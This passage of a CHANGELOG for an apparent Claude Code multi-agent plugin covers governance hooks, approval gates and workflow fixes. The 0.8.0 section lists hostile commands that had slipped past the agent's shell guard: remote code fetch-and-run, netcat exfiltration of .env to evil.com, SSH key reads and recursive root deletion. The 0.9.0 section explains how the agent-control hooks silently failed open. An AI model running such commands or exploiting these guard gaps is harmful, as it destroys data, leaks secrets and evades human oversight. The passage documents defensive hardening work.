the session wrote, and a header either validates or does not. No stage marker, no
correlation id, nothing the model must maintain truthfully about itself.

It blocks on a structural fact and never on judgement, honours `stop_hook_active`
so it cannot loop, and fails open — this hook adds a check, it is not a safety
boundary.

### Fixed — the two most load-bearing human decisions left no record

The requester accepting scope, and QA accepting residual risk, were the only gates
with no policy reference: `human_approval_recorded(none)` passed vacuously. Three
approval categories added.

| Id | Decision | Why it was missing or wrong |
| --- | --- | --- |
| `AP-12` | Scope acceptance | The ground truth every later definition of done derives from, recorded nowhere |
| `AP-13` | Residual quality risk | The simulation filed this under `AP-09`, a branch-protection id |
| `AP-14` | Deployment authorization | Shared `AP-01` with release approval, so the release approval already satisfied it |

`DEPLOY`'s human gate is gone. It carried the same approver and the same policy
reference as `AUTHORIZE` and decided nothing that had not just been decided;
execution now depends on the authorization, and the production commands still
reach a human through `guard_bash`. Human gates may also declare `required_when`,
so a gate can say when it has something to decide.

### Fixed — the delegation graph and the dispatch surface

- **Nine descriptions rewritten.** Read as a set, several pairs claimed the same
  task. `sre` and `reliability-reviewer` both claimed "operational review of a
  change" — and picking `sre` puts a write-capable agent in a reviewer seat, which
  the plugin's own tool policy forbids. Each now names what it uniquely claims and
  which neighbour it defers to.
- **Three roles were told to research with no way to reach the web.**
  `agent-architect`'s core instruction is to verify against the current Claude Code
  documentation. New `researching-author` and `delegating-researcher` profiles;
  still no `Bash`, so nothing fetched can be executed.
- **Domain skills were unreachable by the agents written for them.** No agent holds
  the `Skill` tool, so frontmatter is the only route in: `backend-development` and
  `frontend-development` were preloaded by nobody, while `ux-designer` preloaded an
  implementation checklist for work it is forbidden to do.
- **`code-review` and `security-review` collided with skills Claude Code bundles**,
  and no documentation defines which wins. Renamed to `change-review` and
  `security-assessment` rather than depending on unspecified behaviour.

### Changed — agent bodies carry only what changes behaviour

**136,436 → 113,761 bytes, 17% smaller, roughly 5,700 tokens saved per full-team
run.** Removed from all 30 files: registry metadata a running agent cannot act on
(`Department`, `Owner`, `Version`, `Lifecycle status`, `Evaluation suite`,
`Review frequency`), the `Default model` row that duplicated frontmatter, the
`Skills` section that duplicated frontmatter, and a `Model policy` section
addressed to the caller but stored where only the callee would read it — a running
subagent cannot change its own model. All of it lives in
`policies/agent-registry.json`, which is where it was maintained anyway.

### Fixed — orphan entry criteria and dead loops

- `REVIEW` required "CI has run", while the `CI` stage sequences after it. The
  criterion now names GitLab's pipeline-on-push, which is what it always meant.
- `STAGING` required a candidate someone else had deployed; no stage deployed one.
  Deploying it is now the stage's own first action.
- **`DEBT` was produced and read by nothing.** `OPS` improvement items are now typed
  as `DEBT`, and `IDEA` must state, for each open item in the area, whether the
  change addresses it or leaves it. This is the only point where what operating the
  system taught re-enters what gets built.
- **Recurrence detection was a memory nobody had.** `RCA` now requires
  `prior_rcas_reviewed`, which makes the comparison checkable.
- `skip_recorded(UX)` demanded a skip reason for UX even when UX ran. Replaced with
  `every_skip_recorded()`, which is what the exit criterion always said.

### Fixed — a test that depended on the developer's branch

Renaming this repository's branch to `main` turned two green guard tests red with
no guard code changing: they ran from the plugin's own checkout, so "not on a
protected branch" was an unstated assumption. Guard tests now run in a throwaway
repository, and protected-branch detection has explicit tests in both directions.

### Rejected after checking

- **"notification-agent and its skill are near-total duplication."** Zero
  substantial lines are shared; the agent is the role contract and the skill is the
  procedure.
- **"Set `effort` in agent frontmatter."** `effort` is skill and command
  frontmatter. Claude Code's agent schema carries `name`, `description`, `tools`,
  `model`, `skills` and `color`. Writing it into an agent file would look like
  configuration and be read by nothing. Documented instead.

### New validators

`check_workflows_can_be_abandoned`, `check_skills_are_reachable`, plus the rework
and acceptance-path invariants in `check_cycle.py`. `run_evaluations.py` gained
`json_path_not_contains`, the counterpart its `file_not_contains` implied.

Tests: **213 → 226.**

## [0.9.0] — The guards were not running

Three reviews of the organization design: the SDLC loops, the agent set, and
autonomy readiness. The first finding invalidates the security posture of every
release before this one.

### Security — the escalate tier never blocked anything

`PreToolUse` hooks returned `permissionDecision: "escalate"`. Claude Code's schema
accepts `allow`, `deny`, `ask` and `defer`; a value outside that set is discarded,
**and a discarded decision means the tool call proceeds**.

So every escalate-tier control was inert:

- 25 of 45 command rules — `terraform destroy`, `git push origin main`,
  `DROP TABLE`, production `kubectl edit`, credential rotation
- the credential and control-plane tiers of `guard_write`
- the lateral-spawn tier of `guard_spawn`
- the tier-2 guard-failure handler, which is what runs when a guard breaks

Verified three ways: the literal `"escalate"` appears **zero** times in the CLI
binary; the CLI's own schema is `["allow","deny","ask","defer"]`; and a hook
emitting each value in turn showed `deny` blocked, `ask` blocked, `escalate` **ran**.

`hooks/lib/hooklib.py` now translates the organization's vocabulary to the wire
protocol — the policy keeps the word `escalate`, the wire gets `ask`. Confirmed
end to end: `terraform destroy` is now refused by the guard under `claude -p`.

#### Why every test passed

The tests asserted the guard's own output, never what the platform did with it.
`tests/test_repository.py` now drives all three guards across both tiers and
asserts the emitted value is one Claude Code accepts. Evaluation cases that
pinned `"escalate"` were updated, and `run_evaluations.py` gained the
`json_path_not_contains` check its `file_not_contains` counterpart implied.

### Fixed — the delegation graph contradicted the review routing

`product-manager`, `qa-lead` and `security-architect` were granted `may_spawn` in
the registry and advertised it in their bodies, while running a tool profile with
no `Agent` tool. The guard would have permitted a delegation the role had no way
to attempt.

The consequence was larger than three roles: **four routed reviewers were
reachable by nobody**, and `development-lead` — which *sets* the review routing —
could spawn 4 of the 12 reviewers the routing can require. Every routed
specialist review fell back to the main session.

New `delegating-author` profile (the author profile plus `Agent`, still without
`Bash`, so these roles stay out of the execution path). `agent-evaluator` and
`ai-governance` remain deliberately unspawnable — a change to this repository's
own control plane is AP-10 work and is not delegated down a line the change could
itself alter. That intent is now recorded on the route instead of looking like
the same bug.

### Fixed — acceptance was never machine-determined

All seven cycles declared `determined_by: scripts/check_dod.py against
acceptance.conditions`. **No such mode existed**; the string "acceptance" did not
appear in the script. A cycle was accepted because its own lead wrote `ACCEPTED`
into a rollup.

- `check_dod.py --cycle CYCLE-DEV --project .` evaluates the acceptance
  conditions and prints `ACCEPTED` or `NOT ACCEPTED`.
- `--grammar` now checks cycle acceptance conditions too. A typo there previously
  passed every validator.
- Exit codes stopped contradicting the output: `0` all passed, `1` something
  failed, **`3` nothing failed but evidence is missing**. A stage whose only
  outstanding predicate was a pipeline result printed "never counted as passing"
  and exited `0`, which any caller reads as done.

### Fixed — the rework limit was a number nothing could act on

`rework.limit: 3` had no transition expressing it. `CHANGES_REQUESTED` led only
back to `IN_PROGRESS`, so an item that honestly reported a fourth round had no
legal move but to keep cycling. The machine punished accurate reporting.

Added `CHANGES_REQUESTED --limit_reached--> ESCALATED` to all seven cycles, and
`check_cycle.py` now fails any cycle that declares a limit without such an edge.

### Fixed — withdrawing a work item counted as accepting it

`ESCALATED --withdrawn--> ACCEPTED` reached the terminal accepted state without
`dod_pass`, and `check_cycle.py` explicitly whitelisted the edge from its own
"acceptance is determined, not asserted" rule. Any over-limit item could be closed
through it with zero predicates evaluated.

Withdrawal now has its own terminal state, `WITHDRAWN`, and the whitelist is gone:
`ACCEPTED` is reachable only from `ACCEPTANCE_REQUESTED` via `dod_pass`.

### Known and not fixed

Reported rather than acted on, because they are design decisions rather than bugs:

- **Cycle predicates have no instance scope.** `cycle_accepted(CYCLE-DEV)` matches
  every rollup in the project, so a stale run can vacuously satisfy a new one and
  two concurrent features can starve each other.
- **No workflow can be cancelled**, so an abandoned feature leaves its cycles open.
- **Three human gates fire with nothing to decide** (FEAS in the common case, QA
  on the happy path, DEPLOY), while the two most load-bearing decisions — the
  requester accepting scope, and QA accepting residual risk — leave no machine
  record at all.
- **Missing loops:** non-incident production feedback has no consumer, `DEBT`
  artifacts are produced and never read, and nothing compares a new RCA against
  prior ones.

Tests: **206 → 213.**

## [0.8.0] — Conformance review

An external review of the repository against the current Claude Code platform
documentation, plus an adversarial pass over the command guards. Every finding
below was reproduced before it was fixed, and each fix that could regress now has
a test or a validator behind it.

### Security — command guard bypasses closed

Twenty-four commands reached the Bash guard and were **allowed** that the policy
was written to stop. All are now denied or escalated, with no regression across a
37-command sweep of ordinary work.

| Class | Example that got through | Cause |
| --- | --- | --- |
| Flag order | `kubectl -n prod delete deployment api` | The rule required the verb before the namespace |
| Remote code execution | `bash -c "$(curl -s http://evil/x)"` | Only a literal pipe into a shell was matched |
| Control-plane writes | `echo x >> policies/tool-permissions.json` | Write scope was enforced on the Write tool, not on the shell |
| Secret reads | `grep . ~/.ssh/id_rsa` | The reader list was fixed and short; absolute paths were not covered |
| Exfiltration | `nc evil.com 80 < .env` | Only upload flags were matched, not redirection or substitution |
| Interpreter one-liners | `python3 -c "import shutil;shutil.rmtree('/')"` | Not covered at all |
| System paths | `rm -rf /usr` | Only `/`, `~` and `$HOME` were named |

New rules: `SH-07`, `SH-08` (execution of downloaded content), `OS-04`, `OS-05`
(governed-path shell writes, interpreter one-liners), `SEC-09`, `SEC-10`
(exfiltration by redirection and substitution). Rewritten: `PRD-01`, `PRD-02`,
`PRD-08`, `SEC-01`, `SH-01`, `DB-02`. **45 rules, up from 39.**

Tier 0 in `hooks/lib/failsafe.py` grew from 10 patterns to 13.

**This blocks commands that 0.7.0 allowed.** If a pipeline of yours used any
shape above, it will now stop. That is the intent; the escape is a project
override in `.ai-engineering/`, not a weaker rule.

#### The invariant that caused the one real regression

Tier 0 had `kubectl edit` in its catastrophic screen while the policy only
escalates it, so the same command was denied when the policy was broken and
escalated when it was intact. Tier 0 must be a strict **subset** of the deny
tier, and `tests/test_failsafe.py` now asserts exactly that rather than merely
asserting some rule exists.

### Fixed — platform conformance

- **`AskUserQuestion` removed from `development-lead`, `engineering-director` and
  `incident-commander`.** Claude Code strips it from every subagent even when the
  frontmatter lists it, so these roles' human-escalation channel did not exist,
  and `engineering-director` was instructed to call it. Escalation is now a
  return value: the role ends its turn with an OPEN DECISION block for the main
  session to put to the human.
- **`MultiEdit` removed** from the hook matchers, `guard_write.py` and the docs.
  There is no such tool; the matcher alternative never fired.
- **`SessionStart` now matches `compact` and `fork`** as well as
  `startup|resume|clear`. After an auto-compaction the organizational context was
  silently never re-injected.
- **Skill paths rooted.** `skills/engineering-notifications` called
  `python3 scripts/emit_event.py` and `./bin/aieos-notify`; a skill runs with the
  user's project as the working directory, so neither resolved. Four other skills
  had the same defect in prose references. `bin/` commands are invoked bare
  because `bin/` is placed on PATH.
- **The notification outbox moved** from `notification/outbox/` — which collided
  with the plugin's own `notification/` directory and resolved to neither — to
  `.ai-engineering/outbox/`, beside the event log.
- **Six agent descriptions quoted.** An unquoted `: ` made their frontmatter
  invalid to any strict YAML parser. Claude Code's reader tolerates it; nothing
  else has to.

### Fixed — claims that were no longer true

- A teammate's **permission mode is not fixed at spawn**. Teammates start in the
  lead's mode and individual modes can be changed afterwards; what is impossible
  is setting per-teammate modes *at* spawn. Corrected in five places.
- The **agent-team task list persists**. The directory under `~/.claude/tasks/`
  survives a resume, subject to `cleanupPeriodDays`; it is the team config that is
  removed at session end. It remains authoritative for nothing — but that is now
  stated as the policy choice it is, rather than as a property of the storage.
  `EVAL-AIG-005` asserted the old wording and has been corrected.
- Counts stated in prose disagreed across four documents (29 and 30 agents, 31 and
  32 skills, four different evaluation totals). The repository has **30 agents, 32
  skills, 58 evaluation cases — 35 deterministic and 23 llm-judged**.

### Added — enabling agent teams is a session-level decision

The workflows modelled one direction of degradation: teams unavailable, fall back
to subagent. The opposite direction was undocumented and is the more dangerous
one. With `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` set, **any** named subagent
spawn from the main conversation launches as a teammate — including in the 24
stages declared `execution: subagent`. Because an idle notification carries no
output, such a stage **stalls rather than fails**.

`ai.agent_teams_available` in `project.yaml` was read by no code, which made the
whole fallback contract unenforceable. The `SessionStart` hook now reconciles it
against the environment and reports the mismatch in either direction.

### Added — validators for the defect classes found

Four findings above were mistakes a reviewer caught that no check would have.
Each now has one:

| Check | Catches |
| --- | --- |
| `check_skill_paths` | A plugin path in a skill without `${CLAUDE_PLUGIN_ROOT}`, or a relative `bin/` call |
| `check_frontmatter_is_strict_yaml` | An unquoted `: ` in a frontmatter scalar |
| `check_stated_counts` | Prose that claims a component count the repository contradicts |
| `TestHookPolicyDocumentation` | A guard rule absent from the documented category table |

`check_skill_paths` immediately found five instances the review had missed.

Tests: **193 → 203**, including the 24 bypasses and the 37-command
false-positive sweep as permanent regressions.

## [0.7.0] — Production-readiness audit

The architecture is frozen. This release ran the organization end to end for the
first time and fixed what that surfaced. No new conceptual layers.

### Added — end-to-end SDLC simulation

`scripts/simulate_sdlc.py`: seven scenarios — feature, defect, incident,
security-block, release-rollback, agent-change, onboarding — each run against a
throwaway project. Real artifacts with real headers, real events, real rollups,
and every stage's definition of done evaluated **at the moment that stage
completes**.

Evaluating at the end of a run would test the final state rather than the stage:
`WF-DEFECT/TRIAGE` requires the defect **open** and `WF-DEFECT/VERIFY` requires
it **closed**, and both are correct at their own moment.

```
7 scenarios · 43 stages · 173 predicates
  → 156 pass · 0 fail · 17 require evidence outside the repository
```

`tests/test_simulation.py` fails if a workflow has no scenario, or if a
department cycle is never completed by one.

### Fixed — four defects the simulation found

Each had passed static validation, because static validation checks that
documents are well-formed, not that a process can be completed.

**`required_fields_present` treated an empty list as a missing field.**
`dependencies: []` is a positive statement that there are none. Every root
artifact failed.

**`every_linked` only looked forward.** `every_linked(REQ, ARCH)` required a
requirement to link to an architecture that does not exist when the requirement
is written — unsatisfiable by any author. The edge now counts in either
direction, as `docs/knowledge-structure.md` already said it should.

**`cycle_accepted` was required where the department had barely started.** SRE's
engagement spans `EVIDENCE` → `INVESTIGATE` → `RCA`, so requiring the cycle to be
ACCEPTED at `EVIDENCE` asked a department to have finished before it began.

**A granted security exception bypassed the definition of done.** `CYCLE-SEC` had
`RELEASE_BLOCKED --exception_granted--> ACCEPTED`. A human accepting residual risk
is a real decision, not a reason to skip the cycle's conditions.

### Changed — stages declare where they sit in a department's engagement

`cycle_role: enters | continues | completes`. Only a completing stage carries
`cycle_accepted`, `cycle_rollup_reported` and `no_open_rework`. Validation
requires **exactly one** completing stage per workflow per cycle, and rejects a
non-completing stage that carries them. `WF-INCIDENT/RCA` and `WF-DEFECT/FIX`
gained the cycle declarations they were missing.

### Changed — the head requests acceptance, the system determines it

New `ACCEPTANCE_REQUESTED` state between `READY_FOR_INTEGRATION` and `ACCEPTED`.
The head initiates; `scripts/check_dod.py` decides. `check_cycle.py` now fails any
transition reaching `ACCEPTED` other than through that gate, and rejects head
authority worded as deciding rather than requesting.

Without this the machine-checkable definition of done is advisory, and the whole
Level 2 contract reduces to an agent asserting that it finished.

### Changed — the head-staffing rationale is recorded

`engineering-director` heads six departments because most have one to three
workers, so the effective chain is *organization executive → department lead →
workers*: three levels, not four. `policies/department-cycle.json` now records
when a dedicated department head becomes justified — more than one lead, rollup
volume the executive cannot absorb, or an escalation path the executive should not
sit on, as security already has — and sets a review trigger.

### Added — standardised event fields

Events now require `category`, `actor_type` and `correlation_id`, and carry
`severity`, `status`, `artifact`, `stage` and `cycle` where they apply. Ten
categories: lifecycle, task, review, quality, security, release, deployment,
incident, governance, communication.

`correlation_id` ties every event about one change together across workflows,
which is what makes a feature thread and an audit trail reconstructable.

### Added

- `docs/production-readiness.md` — the audit record, including what it does not prove.
- CI job `sdlc-simulation`; `check_all.sh` runs it too.
- 193 tests, up from 184.

---

### Migration: 0.6.0 → 0.7.0

**Breaking: a stage declaring `department_cycle` must declare `cycle_role`.**
Project-local workflows need it added. Only the completing stage keeps the three
cycle predicates; a non-completing stage carrying them is now an error.

**Breaking: cycles gain `ACCEPTANCE_REQUESTED`.** `READY_FOR_INTEGRATION` now
transitions to it rather than straight to `ACCEPTED`, and `acceptance` requires
`requested_by` and `determined_by`.

**Breaking: events require `category`, `actor_type` and `correlation_id`.**
`scripts/emit_event.py` fills the first two from the catalogue and defaults
`correlation_id` to the subject, so most callers need no change.

**Behaviour change: two predicates became satisfiable.** `required_fields_present`
no longer fails on empty lists; `every_linked` accepts either direction. Stages
that previously failed may now pass — correctly.

## [0.6.0] — Engineering communications


A third platform capability alongside SDLC and governance. Event-driven, not a
generic agent bolted on: the SDLC emits structured events, a deterministic policy
routes them, an agent formats them, and a separate credentialed act sends.

### Added — the event layer

`notification/event-catalogue.json`: **41 event types**, each declaring its level,
what emits it, and its payload fields. Stages now declare `emits:`, and validation
checks **both directions** — a catalogue entry claiming a stage emits it, where
the stage does not, is an error. 22 stages emit.

`scripts/emit_event.py` appends to an append-only log at
`.ai-engineering/events/*.jsonl`. An unknown event type is refused: an event
nothing declares cannot be routed.

### Added — deterministic routing

`scripts/route_event.py` and `notification/notification-policy.json`: **41 rules**
answering should anyone be notified, who, which channel, which thread, how
urgently. **No model is involved.** The agent receives the decision; it cannot
change it, and it cannot decide that nothing is sent.

Levels mirror the SDLC hierarchy, so Level 2 rollups do the work:

| Level | Notify |
| --- | --- |
| worker | **never** — recorded, not pushed |
| team | immediate |
| department | aggregate |
| organization | immediate |
| incident | immediate |

Ten workers on one feature produce **one** update, not thirty. Duplicate
suppression inside a 60-minute window; aggregation emits only when the aggregate
state has meaningfully changed.

### Added — channels with admission rules

Seven spaces, each declaring which event levels it accepts. Routing a lower level
into a channel is a **validation error**, not a judgement call. The `incidents`
space accepts incident-level only (plus `RCA_COMPLETED`, which closes its own
thread), because a space that receives routine traffic stops being read at 03:00.

**No webhook URLs in the repository.** Each channel names the environment
variable holding its URL. A Google Chat incoming webhook is a bearer credential.

### Added — one thread per feature

The thread key is the subject id, so a feature's whole timeline lives in one
thread: requirements approved, decision opened, architecture approved, stories
created, development rollups, defects, release, deployment.

### Added — formatting separated from sending

- `agents/notification-agent.md` (30th agent) — **formats only**. No `Bash`, so it
  cannot send. Write scope limited to `notification/outbox/`.
- `bin/aieos-notify` — dispatch. **Dry run by default**; `--send` is deliberate.
  The webhook is read from the environment and never printed, logged or stored.
- `skills/engineering-notifications/SKILL.md`.

### Added — digests

`scripts/notify_digest.py` builds daily and weekly summaries from the event log.
Counts are computed, never recalled. The weekly **trends** section reports changes
in shape: rework rising, reopen rate rising, the same RCA cause twice, a `DEC`
open longer than a week.

### Added — validation and tests

- Four registry invariants: `notification_agent_cannot_send`,
  `worker_events_are_never_notified`, `notification_routing_is_complete`,
  `no_webhook_urls_in_the_repository`.
- Three evaluation cases including an adversarial LLM-judged one: a request for
  "enough detail that people can tell whether they are affected" on a critical
  finding, which must be refused rather than partially complied with.
- 21 notification tests. 184 total.

### Changed — the freeze, exercised once

`notification-agent` is the 30th agent, and the four-part unfreeze test is applied
in the open in `docs/organization-freeze.md`. The deciding point was the fourth:
giving the organization's outbound voice to `docs-writer` would mean one mistake
reaches everyone and cannot be recalled.

### Fixed

- `notification-agent` was first defaulted to `haiku` because filling a template
  is mechanical. The model-floor test rejected it: a MEDIUM-risk role publishing
  outside the organization cannot sit below `sonnet`, because a leaked secret is
  unrecoverable. Raised.
- Channel admission was implicit; a test caught `DEPLOYMENT_FAILED` and
  `INCIDENT_RESOLVED` routing to announcements. Rather than bending the rule,
  announcements was widened deliberately and the reason recorded.

---

### Migration: 0.5.0 → 0.6.0

**Additive.** Nothing existing changes behaviour. A project that sets no webhook
environment variables emits and routes events but sends nothing, and every
dispatch is a dry run.

**To turn it on:** create the Chat spaces, set the `AIEOS_CHAT_WEBHOOK_*`
variables as masked, protected CI variables, and run `bin/aieos-notify --send`
from the pipeline. Never commit a URL.

**Not shipped, deliberately:** anything interactive. `@bot status FEAT-103` needs
a real Google Chat app handling interaction events, not an incoming webhook. And
approval stays in GitLab — a chat message must never become production
authorization.

## [0.5.0] — The human governs, an agent manages


v0.4.0 made every department head a named human. That put a person in the middle
of every departmental rollup, which contradicts the autonomy target. Corrected.

### Changed — five positions, not four

```
HUMAN OWNER    governance only: the approval categories that name this role,
     │         plus anything the head escalates. Not routine rollups.
     ▼
HEAD (agent)   plans, delegates, receives the rollup, decides whether done
     ▼
LEAD (agent)   decomposes, assigns, produces the rollup
     ▼
WORKER (agent) executes and self-validates
     ▼
PEER (agent)   reviews detail, independent, cannot write the artifact
```

`engineering-director` heads six of seven departments. Not a convenience: its
role contract already covers sequencing and cross-department arbitration, and it
already holds the spawn authority for every cycle lead. **No new agents** — the
set stays frozen at 29.

Validation now fails a head that cannot spawn its own lead. A manager that cannot
delegate is not a manager.

### Changed — one argued exception

`CYCLE-SEC` keeps a human head. Placing the delivery-accountable agent above
security would put schedule pressure in security's reporting line, which is the
one thing security's independence exists to prevent. At most one such exception
is permitted, and it must state why.

### Added — human owners with specific authority

Each cycle names its `human_owner` and **what that human actually decides**:

| Cycle | Human owner | Authority |
| --- | --- | --- |
| `CYCLE-PROD` | project-owner | Requirement scope; AP-03 |
| `CYCLE-ARCH` | architecture-owner | AP-02, AP-03, AP-06 |
| `CYCLE-QA` | qa-owner | Residual risk where exit criteria are waived |
| `CYCLE-DEV` | engineering-owner | AP-09; scope beyond approved stories |
| `CYCLE-SEC` | security-owner | AP-04, AP-08; release blocks |
| `CYCLE-DEVOPS` | engineering-owner | AP-07, AP-01 |
| `CYCLE-SRE` | on-call-owner | AP-01 production actions; AP-11 data access |

`authority` is required and validated. A governance role that decides nothing
specific decides everything by default.

### Changed — escalation reaches the human last

`worker → peer_reviewer → lead → head → human_owner`, in that order. A worker
never escalates straight to the head; the head reaches the human only for
governance or for what the department cannot resolve.

### Changed — incident investigation is unconditionally TEAM_REQUIRED

Stated explicitly for the security-compromise case: a novel incident and a
suspected compromise both run through `INVESTIGATE`, and one agent producing four
viewpoints is not four independent agents. A fourth guarantee was added to the
degraded mode — a single investigator is also a single point of failure for
noticing that the evidence itself has been tampered with.

### Added

- Three registry invariants: `departments_are_run_by_agents`,
  `escalation_reaches_the_human_last`, `incident_investigation_requires_a_team`.
- Two evaluation cases: `EVAL-GOV-008`, `EVAL-SRE-006`. 55 cases, 33 deterministic.
- 163 tests, up from 159.

### Fixed

- A refactor of `check_cycle.py` dropped the peer-reviewer independence checks.
  Restored, with a negative test that a head with the wrong profile, a head that
  cannot spawn its lead, and a human owner that is an agent are all rejected.

---

### Migration: 0.4.0 → 0.5.0

**Breaking: cycle `positions` requires `human_owner`.** Every cycle must name the
human role and what it decides.

**Breaking: `head` is now an object** with `kind` (`agent` or `human`) and
`role`. A `human` head additionally requires `human_exception_reason`.

**Breaking: `escalation.order` must end with `human_owner`**, not `head`.

**Behaviour change: rollups go to an agent, not a person.** If your process
routed departmental rollups to a human inbox, that human now receives only
escalations and approval requests. The head decides whether the department is
done.

## [0.4.0] — Department execution cycles (Level 2)


The macro workflows govern stage-to-stage progression. This release adds the
delegation, review and rework loop that runs **inside** each stage. It is added
underneath the existing workflows, not in place of them.

**No new agents.** The set stays frozen at 29. The cycle is defined in terms of
*positions* — head, lead, worker, peer reviewer, specialist reviewer — filled by
existing agents and by the named humans in the project's `approval:` section.

### Added — the generic cycle

`policies/department-cycle.json` and `schemas/department-cycle.schema.json`.

```
head → lead → worker → self-check → peer review → lead review
     → rework → acceptance → rollup
```

Ten states, with `CHANGES_REQUESTED` returning to `IN_PROGRESS`, `ESCALATED` for
what the department cannot resolve, and `BLOCKED` for what it is waiting on.
`ACCEPTED` requires **every** item in the set to reach `READY_FOR_INTEGRATION`;
one accepted item does not accept the set.

### Added — seven department cycles

`sdlc/cycles/`: development, QA, security, architecture, product, platform, SRE.

| Cycle | Head (human) | Lead | Workers | Peer reviewer |
| --- | --- | --- | --- | --- |
| `CYCLE-DEV` | engineering-owner | `development-lead` | backend, frontend, data | `code-reviewer` |
| `CYCLE-QA` | qa-owner | `qa-lead` | `qa-engineer` | `test-reviewer` |
| `CYCLE-SEC` | security-owner | `security-architect` | `security-reviewer`, `dependency-reviewer` | mutual |
| `CYCLE-ARCH` | architecture-owner | `solution-architect` | `solution-architect` | `architecture-reviewer` |
| `CYCLE-PROD` | project-owner | `product-manager` | `requirements-analyst` | `qa-lead` |
| `CYCLE-DEVOPS` | engineering-owner | `devops-engineer` | `devops-engineer` | `reliability-reviewer` |
| `CYCLE-SRE` | on-call-owner | `sre` | `sre` | `reliability-reviewer` |

### Added — the join to the macro workflow

Stages gain `department_cycle`, and their definition of done gains
`cycle_accepted()`, `cycle_rollup_reported()` and `no_open_rework()`. **A macro
stage cannot complete while its department's loop is escalated or in rework.**
19 stages across the seven workflows are wired.

### Added — the peer review tier

A read-only reviewer sits between worker and lead. Minor findings go straight
back to the worker and never reach the lead; the lead reviews adherence and
integration rather than line-level detail; the head reads a rollup.

The enforced constraint is that the peer reviewer **cannot write the artifact it
reviews** — not merely that it holds no write tools, which was too coarse and
wrongly flagged `qa-lead` reviewing requirements for testability.

### Added — QA defect triage

A sub-cycle: a tester observing a failure does not create a development defect.
`qa-lead` validates first, through five questions, and routes to one of
`not-a-defect`, `test-defect`, `environment-defect`, `requirement-ambiguity` or
`product-defect`. Only the last becomes a `DEF` and enters `WF-DEFECT`.

### Added — bounded rework and an escalation tree

Rework limit **3**, then escalate. A third round means the acceptance criteria,
the design or an unwritten disagreement is the real problem.

Escalation runs worker → peer reviewer → lead → head, and **never skips the
lead**: an escalation that reached the head without the lead knowing means the
lead was not told about a problem in its own department. Lateral escalation
routes architecture, requirement, security, environment and operational issues
out of the department.

### Added — the rollup

Produced by the lead on `ACCEPTED` or on any escalation leaving the department,
recorded in the work-item set artifact's new `rollup:` block. Per-stream verdicts,
aggregate finding counts, total rework rounds, escalations, artifacts, next gate.
The head reads that and never an individual review round.

### Added — tooling

- `scripts/check_cycle.py`: state-machine analysis (reachability, dead ends,
  terminal reachability, both reviews able to request changes), position checks
  and two-way wiring checks. Plus `--graph` and `--trace`, which walk a happy
  path and a rework path through any cycle.
- Six registry invariants and three evaluation cases: `EVAL-ENG-004`,
  `EVAL-GOV-007`, `EVAL-QA-004`. 53 cases, 31 deterministic.
- 159 tests, up from 147. CI job extended.
- `docs/department-cycles.md`, `templates/artifacts/rollup.md`.

### Fixed

- `WF-FEATURE/ARCH` was claimed by two cycles. A stage runs exactly one; security
  participates in architecture as a specialist reviewer inside `CYCLE-ARCH`.
- The peer-review independence check was too coarse, as above.

---

### Migration: 0.3.0 → 0.4.0

**Additive for macro workflows.** Existing stages without a `department_cycle`
keep working unchanged.

**Stages that gained a cycle gained three DoD predicates.** A project tracking
stage completion must now record a `rollup:` block on the work-item set artifact.
Without it, `cycle_rollup_reported()` fails and the stage does not complete.

**New optional artifact field: `rollup`.** Only required on the work-item set
artifact of a stage that runs a cycle.

**Project configuration must name the human roles the cycles reference**:
`engineering_owner`, `qa_owner`, `security_owner`, `architecture_owner`,
`project_owner`, `on_call_owner`. These were already in the 0.3.0 `approval:`
section; the cycles now read them.

**Not added, deliberately:** Backend Lead, Frontend Lead, Data Lead, Senior
Developer, Development Head, QA Head, QA Architect. Each is a *position* in the
cycle rather than a role, and the reasoning is in
[`docs/organization-freeze.md`](docs/organization-freeze.md). If your
organization needs them as distinct agents, that is an `agent-architect` ADR and
a council decision, not a silent addition.

## [0.3.0] — Architecture frozen


Schema hardening and implementation correctness. **No new agents**: the set is
frozen at 29, and the four-part test for unfreezing is in
[`docs/organization-freeze.md`](docs/organization-freeze.md).

### Added — full artifact contracts

`policies/artifact-model.json` v2. Every one of 21 types now declares who
**creates** it, who **may modify** it, who **may review** it, which **human** may
approve it, where it is **stored**, its **required fields**, what it
**depends on** and what **consumes** it.

Two new first-class artifacts:

- **`DEC` open decision** — the question, options with what each forecloses, the
  impact, the owner, and `blocks: [ARCH, ADR]`. An agent blocked by one names it
  once and stops, instead of re-asking every session.
- **`EVID` evidence** — logs, timestamps, deployment versions, configuration
  snapshots, metrics, traces and the investigation commands. Immutable
  (`may_modify: []`), collected and sealed **before** any destructive remediation.

`INC` is now `append_only` rather than immutable: the commander adds timeline
entries during an incident and nothing is rewritten afterwards.

### Added — evidence preservation as a stage

`WF-INCIDENT` gains `EVIDENCE`, between `TRIAGE` and `INVESTIGATE`. `MITIGATE`
cannot complete without `evidence_sealed()`. For a suspected security compromise
the stage is mandatory and blocking.

### Changed — agent gates state what they check

Every `agent_gate` now requires a `purpose` naming the dimension: *testability*,
*feasibility completeness*, *requirement coverage and non-functional fitness*,
*coverage and evidence quality*. Validation rejects a purpose that begins with
"approve", "sign off" or "accept" — that would be an approval, which an agent may
not give.

### Changed — release approval, authorization and execution are three acts

`policies/release-authority.json`, and a new `AUTHORIZE` stage in both deploying
workflows. The release state machine is now
`draft → in-review → approved → authorized → done | rolled-back`.

In 0.2.0 approval and authorization were one act, so a release approved on Monday
carried standing permission to deploy on Friday against a changed production.

### Added — human identity is structural

`approvals` entries now require `id`, `approver_id`, `approver_role`, `at`,
`recorded_in` and `decision`. `approver_role` must name a human role; validation
rejects an agent name. `.ai-engineering/project.yaml` gains a required `approval:`
section naming the human behind each authority — a category with no named human
cannot be satisfied.

### Added — team requirement levels

`TEAM_REQUIRED` / `TEAM_PREFERRED` / `TEAM_OPTIONAL`, each with a
`degraded_mode` stating what is genuinely lost without a team. Falling back
silently would pretend a subagent is equivalent.

`WF-INCIDENT INVESTIGATE` is `TEAM_REQUIRED` and falls back to **escalate**.
`WF-FEATURE ARCH` and `WF-RELEASE STAGING` are PREFERRED; `WF-FEATURE DEV` is
OPTIONAL.

### Added — coupled surfaces

`policies/coupling-policy.json`. File disjointness is necessary and not
sufficient: a backend agent and a frontend agent editing different files both
change the API contract. Five surfaces — api-contract, database-schema,
deployment-manifest, event-schema, shared-configuration — each with one owning
role. Stages declare what they touch; validation fails when two parallel stages
share one.

### Added — six high-risk command rules, and structural enforcement

`SEC-08` (chmod on credential material), `PRD-08` (in-place production config
edit), `PRD-09` (production service stop/restart), `CLD-01` (cloud resource
